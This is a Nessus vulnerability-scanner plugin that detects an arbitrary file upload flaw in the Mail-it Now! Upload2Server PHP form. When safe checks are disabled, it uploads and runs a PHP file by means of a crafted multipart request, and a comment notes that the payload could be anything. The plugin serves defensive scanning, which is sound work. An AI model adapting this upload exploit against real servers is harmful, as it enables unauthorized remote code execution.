#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application is prone to an
arbitrary file upload vulnerability. 

Description :

The remote host is running Mail-it Now! Upload2Server, a free, PHP
feedback form script supporting file uploads. 

The version of Upload2Server installed on the remote host stores
uploaded files insecurely.  An attacker may be able to exploit this
flaw to upload a file with arbitrary code and then execute it on the
remote host subject to the privileges of the web server user id. 

See also : 

http://retrogod.altervista.org/mailitnow.html

Solution : 

Remove the script or edit the script to change the upload directory. 

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19698);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(14821);

  name["english"] = "Mail-it Now! Upload2Server Arbitrary File Upload Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for arbitrary file upload vulnerability in Mail-it Now! Upload2Server";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
foreach dir (cgi_dirs()) {
  # Grab the affected script.
  req = http_get(item:string(dir, "/contact.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like Upload2Server...
  if ('<!--This script sources from SkyMinds.Net (http://www.skyminds.net/)' >< res) {
    # If safe_checks are *not* enabled...
    if (!safe_checks()) {
      # Before we actually send this, we need to record the time.
      now = unixtime();
      rand = rand_str();

      # Try to exploit the flaw.
      boundary = "bound";
      req = string(
        "POST ",  dir, "/contact.php HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
        "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
        # nb: we'll add the Content-Length header and post data later.
      );
      boundary = string("--", boundary);
      postdata = string(
        boundary, "\r\n", 
        'Content-Disposition: form-data; name="From"', "\r\n",
        "\r\n",
        # nb: an invalid address will keep mail from being sent but
        #     doesn't prevent the upload from working.
        rand, "@zj5@example.com\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="Name"', "\r\n",
        "\r\n",
        rand, "\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="Msg"', "\r\n",
        "\r\n",
        SCRIPT_NAME, "\r\n",

        boundary, "\r\n", 
        'Content-Disposition: form-data; name="fileup[]"; filename="', rand, '.php"', "\r\n",
        "Content-Type: text/plain\r\n",
        "\r\n",
        # NB: This is the actual exploit code; you could put pretty much
        #     anything you want here.
        "<? phpinfo() ?>\r\n",

        boundary, "\r\n",
        'Content-Disposition: form-data; name="submit"', "\r\n",
        "\r\n",
        "Send\r\n",

        boundary, "--", "\r\n"
      );
      req = string(
        req,
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # Try to run the attachment we just uploaded.
      #
      # nb: we try a range around the time because of inevitable clock skew.
      for (i = (now - 10); i < (now + 10); i++) {
        url = string(dir, "/upload/", i, "-", rand, ".php");
        req = http_get(item:url, port:port);
        res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
        if (res == NULL) exit(0);

        # There's a problem if it looks like the output of phpinfo().
        if ("PHP Version" >< res) {
          report = string(
            desc["english"],
            "\n\n",
            "Plugin output :\n",
            "\n",
            "Nessus has successfully exploited this vulnerability by uploading\n",
            "a file with PHP code that reveals information about the PHP\n",
            "configuration on the remote host. The file is located under\n",
            "the web server's document directory as:\n",
            "         ", url, "\n",
            "You are strongly encouraged to delete this attachment as soon as\n",
            "possible as it can be run by anyone who accesses it remotely.\n"
          );
          security_hole(port:port, data:report);
          exit(0);
        }
      }
    }

    # Check the banner, in case the clock on the nessusd or remote 
    # server are out of sync or safe checks is enabled.
    if (
      "Mail-it Now! Upload2Server" >< res &&
      egrep(string:res, pattern:"^# Mail-it Now! Upload2Server 1\.[0-5] +#$")
    ) {
      security_hole(port);
      exit(0);
    }
  }
}
